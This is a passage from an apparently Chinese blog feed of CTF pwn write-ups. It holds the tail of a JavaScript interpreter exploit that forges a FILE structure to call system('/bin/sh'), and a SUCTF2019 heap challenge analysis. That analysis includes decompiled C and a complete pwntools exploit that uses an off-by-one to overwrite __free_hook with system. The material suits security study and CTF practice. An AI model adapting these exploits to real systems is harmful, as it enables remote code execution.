class="number">8</span>*i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">offset,target</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">        <span class="built_in">JSON</span>.parse[offset+i]=(target&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> start_addr=<span class="number">0x55555556e800</span><span class="number">-0x555555554000</span>;</span><br><span class="line"><span class="keyword">let</span> got_addr=<span class="number">0x00000000022CDF0</span>;</span><br><span class="line"><span class="keyword">let</span> free_got=<span class="number">0x00000000022CE08</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> free_addr=read(free_got-start_addr);</span><br><span class="line"><span class="keyword">let</span> libc_base=free_addr<span class="number">-0x844f0</span>;</span><br><span class="line"><span class="keyword">let</span> code_base=read(<span class="number">0x00000000022CAA8</span>-start_addr)<span class="number">-0x000000000001D40</span>;</span><br><span class="line"><span class="keyword">let</span> system_addr=libc_base+<span class="number">0x45390</span>;</span><br><span class="line"><span class="keyword">let</span> bin_sh_addr=libc_base+<span class="number">0x18cd57</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> cs_log_file=<span class="number">0x00000000022D228</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> bss_addr=<span class="number">0x00000000022D218</span>+<span class="number">0x100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> _IO_str_jumps=<span class="number">0x3c37a0</span>+libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_file=[</span><br><span class="line"><span class="number">0xfbad1800</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,bin_sh_addr,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ;i &lt; fake_file.length ; i ++)&#123;</span><br><span class="line">    write(bss_addr-start_addr+i*<span class="number">8</span>,fake_file[i]);</span><br><span class="line">&#125;</span><br><span class="line">write(bss_addr-start_addr+<span class="number">0x88</span>,<span class="number">0x7ffff78c6780</span><span class="number">-0x7ffff7500000</span>+libc_base)</span><br><span class="line">fake_file=[_IO_str_jumps<span class="number">-8</span>,<span class="number">0</span>,system_addr];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;fake_file.length;i++)&#123;</span><br><span class="line">    write(bss_addr-start_addr+<span class="number">0xd8</span>+i*<span class="number">8</span>,fake_file[i]);</span><br><span class="line">&#125;</span><br><span class="line">write(cs_log_file-start_addr,bss_addr+code_base);</span><br><span class="line">write(<span class="number">0x00000000022D220</span>-start_addr,<span class="number">999</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;之前看过的一道题，因为想知道js解释器的工作原理，就读了读源码，后来看了v8，这道题就太监了 …&lt;/p&gt;
&lt;p&gt;参考了: &lt;a href=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>复现近几个月比赛不会做的题...</title>
    <link href="http://yoursite.com/2019/08/31/%E5%A4%8D%E7%8E%B0%E8%BF%91%E5%87%A0%E4%B8%AA%E6%9C%88%E6%AF%94%E8%B5%9B%E4%B8%8D%E4%BC%9A%E5%81%9A%E7%9A%84%E9%A2%98/"/>
    <id>http://yoursite.com/2019/08/31/复现近几个月比赛不会做的题/</id>
    <published>2019-08-31T01:12:10.000Z</published>
    <updated>2019-09-02T12:35:13.224Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h3><p>两个多月没咋学pwn了，看了一个多月v8没啥太大进展…，复现下近几个月的比赛，陆陆续续更新下…</p><h3 id="suctf2019-二手破电脑"><a href="#suctf2019-二手破电脑" class="headerlink" title="suctf2019_二手破电脑:"></a>suctf2019_二手破电脑:</h3><p>19/08/30</p><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>程序的开头会malloc一块内存，用来存放info指针:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptr = do_init();</span><br></pre></td></tr></table></figure></p><p>存储信息的info结构体如下:<br><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">00000000 </span>info            struc ; (sizeof=<span class="number">0</span>x10, mappedto_5)</span><br><span class="line"><span class="symbol">00000000 </span>comment_ptr     dd ?</span><br><span class="line"><span class="symbol">00000004 </span>name_ptr        dd ?</span><br><span class="line"><span class="symbol">00000008 </span>price           dd ?</span><br><span class="line"><span class="number">0000000</span>C score           dd ?</span><br><span class="line"><span class="symbol">00000010 </span>info            ends</span><br></pre></td></tr></table></figure></p><p>add一次可以得到如下chunk:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x18</span> <span class="keyword">byte</span>    用于存放info的chunk</span><br><span class="line"><span class="built_in">size</span>&lt;= <span class="number">0x200</span> 用于存放 name的chunk</span><br></pre></td></tr></table></figure></p><p>add函数调用的malloc_and_read存在offbyone，null字节溢出:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">cdecl <span class="title">malloc_and_read</span><span class="params">(<span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">void</span> *result; <span class="comment">// eax</span></span><br><span class="line">  __int16 v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x1FF</span> )</span><br><span class="line">    size = <span class="number">512</span>;</span><br><span class="line">  v1 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  v3 = <span class="string">'%'</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v3 + <span class="number">1</span>, <span class="string">"%ds"</span>, size);</span><br><span class="line">  __isoc99_scanf(&amp;v3, v1);</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里printf根据size输入字符串后会在末尾加上’\x00’，可以溢出了一个字节</p><p>add_comment函数这里读入信息直接使用的read，不会自己加上\x00，可以泄露垃圾数据:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">info *__<span class="function">cdecl <span class="title">comment</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  info *v1; <span class="comment">// esi</span></span><br><span class="line">  info *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">9</span> || !*(_DWORD *)(<span class="number">4</span> * idx + a1) || **(_DWORD **)(<span class="number">4</span> * idx + a1) )</span><br><span class="line">    <span class="keyword">return</span> (info *)<span class="built_in">puts</span>(<span class="string">"Too young"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Comment on %s : "</span>, *(_DWORD *)(*(_DWORD *)(<span class="number">4</span> * idx + a1) + <span class="number">4</span>));<span class="comment">// name</span></span><br><span class="line">  v1 = *(info **)(<span class="number">4</span> * idx + a1);</span><br><span class="line">  v1-&gt;comment_ptr = (<span class="keyword">int</span>)<span class="built_in">malloc</span>(<span class="number">0x8C</span>u);</span><br><span class="line">  read(<span class="number">0</span>, **(<span class="keyword">void</span> ***)(<span class="number">4</span> * idx + a1), <span class="number">0x8C</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"And its score: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  result = *(info **)(<span class="number">4</span> * idx + a1);</span><br><span class="line">  result-&gt;score = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>首先使用comment泄露出libc的地址:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#0</span></span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'A'</span>,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)<span class="comment"># comment_0 放入到unsorted bin 中</span></span><br><span class="line">comment(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">4</span>,<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">a.recvuntil(<span class="string">"A"</span>*<span class="number">4</span>)</span><br><span class="line">libc_base=u32(a.recv(<span class="number">4</span>))<span class="number">-48</span>-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x18</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br></pre></td></tr></table></figure></p><p>然后利用offbyone构造堆块重叠.这里的info_5是用来泄露libc的，在堆块重叠之前free掉info_5，这样它的name chunk会进入到unsorted bin，发生合并重叠后，unsorted bin里会有两个chunk，这样info5的name chunk的bk就会有heap的地址，再利用增加comment申请掉这个chunk，就可以泄露出heap的地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x8c</span>,<span class="string">'/bin/sh\x00\n'</span>,<span class="number">10</span>)<span class="comment">#0 清空unsorted bin</span></span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>,<span class="number">10</span>)<span class="comment">#2 name chunk -&gt; 0x56559120</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>,<span class="number">10</span>)<span class="comment">#3 info chunk -&gt; 0x56559220 name_chunk -&gt; 0x56559238</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">"A\n"</span>,<span class="number">10</span>)<span class="comment">#1  0x56559320</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#4  </span></span><br><span class="line">add(<span class="number">0x8c</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#5 用来free到 unsorted bin 中，然后泄露heap</span></span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#6 防止合并</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'A'</span>*<span class="number">0xf0</span>+p32(<span class="number">0x300</span>+<span class="number">0x18</span>)+<span class="string">'\n'</span>,<span class="number">10</span>)<span class="comment">#4</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#绕过unlink检查</span></span><br><span class="line">delete(<span class="number">4</span>)<span class="comment">#合并</span></span><br></pre></td></tr></table></figure></p><p>这里注意要构造出存放info的chunk在重叠的堆块之中的情况，这样可以修改info chunk进行后续的操作:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">0x56f7e120 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 257, </span><br><span class="line">  fd = 0x6e69622f, </span><br><span class="line">  bk = 0x68732f, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x56f7e220 FASTBIN &#123;# add(0xfc,&apos;/bin/sh\x00&apos;+&apos;\n&apos;,10)#3 info chunk -&gt; 0x56559220 name_chunk -&gt; 0x56559238</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 25, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x56f7e240, </span><br><span class="line">  fd_nextsize = 0xa, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x56f7e238 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 257, </span><br><span class="line">  fd = 0x6e69622f, </span><br><span class="line">  bk = 0x68732f, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x56f7e338 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 257, </span><br><span class="line">  fd = 0x41, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x56f7e438 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 257, </span><br><span class="line">  fd = 0x41, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>构造堆块重叠后，修改info chunk的name指针指向该chunk的前面，利用rename函数再次修改name指针为<strong>free_hook，后续的morepower操作可以再次修改一次name，这样就可以修改</strong>free_hook为system函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">comment(<span class="number">0</span>,<span class="string">'A'</span>*<span class="number">4</span>,<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">a.recvuntil(<span class="string">"A"</span>*<span class="number">4</span>)</span><br><span class="line">heap_base=u32(a.recv(<span class="number">4</span>))<span class="number">-0x120</span></span><br><span class="line">success(<span class="string">"heap_base ==&gt; 0x%x"</span>%heap_base)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0xe8</span>+p32(<span class="number">0</span>)+p32(<span class="number">0xa8</span>+<span class="number">1</span>)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(<span class="number">0x18</span>+<span class="number">1</span>)+<span class="string">'AAA\x00'</span></span><br><span class="line">payload+=p32(heap_base+<span class="number">0x218</span>)</span><br><span class="line">payload+=p32(<span class="number">0x21</span>)*<span class="number">40</span>+<span class="string">'\n'</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x1fc</span>,payload,<span class="number">0x10</span>)</span><br><span class="line">rename(<span class="number">3</span>,p32(__free_hook)*<span class="number">6</span>,p32(system_addr))</span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure></p><p>这里注意第一次修改name_ptr的时候，要伪造好chunk，malloc_usable_size函数为检查指向的chunk是否为inuse的，如果是inuse会返回该chunk的size - 4</p><h4 id="完整的exp如下"><a href="#完整的exp如下" class="headerlink" title="完整的exp如下:"></a>完整的exp如下:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">context.terminal=[<span class="string">"tmux"</span>,<span class="string">"splitw"</span>,<span class="string">"-h"</span>]</span><br><span class="line">elf=ELF(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    a=process(<span class="string">"./pwn"</span>)</span><br><span class="line">    libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    a=remote(<span class="string">""</span>,)</span><br><span class="line">    libc=ELF(<span class="string">""</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(a,<span class="string">'''</span></span><br><span class="line"><span class="string">    b *(0x56555000+0x0000BFA)</span></span><br><span class="line"><span class="string">    b *(0x56555000+0x00000D4B)</span></span><br><span class="line"><span class="string">    b *(0x56555000+0x0000EA7)</span></span><br><span class="line"><span class="string">    b *(0x56555000+0x000118F)</span></span><br><span class="line"><span class="string">    b *(0x00012BA+0x56555000)</span></span><br><span class="line"><span class="string">    '''</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(idx)</span>:</span></span><br><span class="line">    a.recvuntil(<span class="string">"&gt;&gt;&gt; "</span>)</span><br><span class="line">    a.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,price)</span>:</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Name length: "</span>)</span><br><span class="line">    a.sendline(str(size))</span><br><span class="line">    a.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">    a.send(name)</span><br><span class="line">    a.recvuntil(<span class="string">"Price: "</span>)</span><br><span class="line">    a.sendline(str(price))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"WHICH IS THE RUBBISH PC? Give me your index: "</span>)</span><br><span class="line">    a.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span><span class="params">(idx,com,s)</span>:</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    a.sendline(str(idx))</span><br><span class="line">    a.recvuntil(<span class="string">"Comment on "</span>)</span><br><span class="line">    name=a.recvuntil(<span class="string">" : "</span>,drop=<span class="keyword">True</span>)</span><br><span class="line">    a.send(com)</span><br><span class="line">    a.recvuntil(<span class="string">"And its score: "</span>)</span><br><span class="line">    a.sendline(str(s))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span><span class="params">(idx,content,s)</span>:</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"Give me an index: "</span>)</span><br><span class="line">    a.sendline(str(idx))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    a.send(content)</span><br><span class="line">    a.recvuntil(<span class="string">"Wanna get more power?(y/n)"</span>)</span><br><span class="line">    a.sendline(<span class="string">"y"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">": "</span>)</span><br><span class="line">    a.sendline(<span class="string">"e4SyD1C!"</span>)</span><br><span class="line">    a.recvuntil(<span class="string">"y Pwner"</span>)</span><br><span class="line">    a.sendline(s)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#0</span></span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'A'</span>,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">comment(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">4</span>,<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">a.recvuntil(<span class="string">"A"</span>*<span class="number">4</span>)</span><br><span class="line">libc_base=u32(a.recv(<span class="number">4</span>))<span class="number">-48</span>-libc.symbols[<span class="string">"__malloc_hook"</span>]<span class="number">-0x18</span></span><br><span class="line">success(<span class="string">"libc_base ==&gt; 0x%x"</span>%libc_base)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">__free_hook=libc_base+libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_addr=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">add(<span class="number">0x8c</span>,<span class="string">'/bin/sh\x00\n'</span>,<span class="number">10</span>)<span class="comment">#0 清空unsorted bin</span></span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>,<span class="number">10</span>)<span class="comment">#2 name chunk -&gt; 0x56559120</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'\n'</span>,<span class="number">10</span>)<span class="comment">#3 info chunk -&gt; 0x56559220 name_chunk -&gt; 0x56559238</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">"A\n"</span>,<span class="number">10</span>)<span class="comment">#1  0x56559320</span></span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#4  </span></span><br><span class="line">add(<span class="number">0x8c</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#5 用来free到 unsorted bin 中，然后泄露heap</span></span><br><span class="line">add(<span class="number">0x14</span>,<span class="string">'A\n'</span>,<span class="number">10</span>)<span class="comment">#6 防止合并</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xfc</span>,<span class="string">'/bin/sh\x00'</span>+<span class="string">'A'</span>*<span class="number">0xf0</span>+p32(<span class="number">0x300</span>+<span class="number">0x18</span>)+<span class="string">'\n'</span>,<span class="number">10</span>)<span class="comment">#4</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#绕过unlink检查</span></span><br><span class="line">delete(<span class="number">4</span>)<span class="comment">#合并</span></span><br><span class="line">comment(<span class="number">0</span>,<span class="string">'A'</span>*<span class="number">4</span>,<span class="number">10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">a.recvuntil(<span class="string">"A"</span>*<span class="number">4</span>)</span><br><span class="line">heap_base=u32(a.recv(<span class="number">4</span>))<span class="number">-0x120</span></span><br><span class="line">success(<span class="string">"heap_base ==&gt; 0x%x"</span>%heap_base)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0xe8</span>+p32(<span class="number">0</span>)+p32(<span class="number">0xa8</span>+<span class="number">1</span>)+<span class="string">'A'</span>*<span class="number">8</span></span><br><span class="line">payload+=p32(<span class="number">0</span>)+p32(<span class="number">0x18</span>+<span class="number">1</span>)+<span class="string">'AAA\x00'</span></span><br><span class="line">payload+=p32(heap_base+<span class="number">0x218</span>)</span><br><span class="line">payload+=p32(<span class="number">0x21</span>)*<span class="number">40</span>+<span class="string">'\n'</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x1fc</span>,payload,<span class="number">0x10</span>)</span><br><span class="line">rename(<span class="number">3</span>,p32(__free_hook)*<span class="number">6</span>,p32(system_addr))</span><br><span class="line"></span><br><span class="line">a.interactive()</span><br></pre></td></tr></table></figure><h3 id="de1ctf2019-unprintable"><a href="#de1ctf2019-unprintable" class="headerlink" 